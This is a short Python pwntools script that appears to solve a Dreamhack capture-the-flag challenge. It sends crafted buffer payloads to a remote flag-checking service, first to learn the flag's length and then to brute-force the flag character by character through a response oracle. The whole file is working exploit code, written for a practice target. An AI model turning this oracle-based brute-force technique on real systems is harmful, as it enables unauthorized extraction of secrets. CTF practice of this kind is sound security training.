from pwn import *


#Find flag length
flag_len = 0
for length in range(0x3f, 0, -1):
    test_payload = b'A' * length
    payload = test_payload + b'\x00' * (0x40 - len(test_payload)) + test_payload
    #p = process('./checkflag')
    p = remote('host1.dreamhack.games', 8843)
    p.sendafter(b'flag?', payload)
    if ord('F') in p.recvuntil(b'!\n'):
        print('length:', length + 1)
        flag_len = length + 1
        p.close()
        break
    p.close()

#Bruteforcing length 16 - 4(DH{})
found_flag = b''
for i in range(flag_len - 4):
    for c in range(0x20, 0x7f):
        test_payload = b'A' * (flag_len - 2 - i) + chr(c).encode() + found_flag + b'}'
        payload = test_payload + b'\x00' * (0x40 - len(test_payload)) + b'A' * (flag_len - 2 - i)
        #p = process('./checkflag')
        p = remote('host1.dreamhack.games', 8843)

        p.sendafter(b'flag?', payload)
        if ord('C') in p.recvuntil(b'!\n'):
            print(f'flag[{flag_len - 2 - i}] = {chr(c)}')
            found_flag = chr(c).encode() + found_flag
            p.close()
            break
        p.close()

print('DH{' + found_flag.decode() + '}')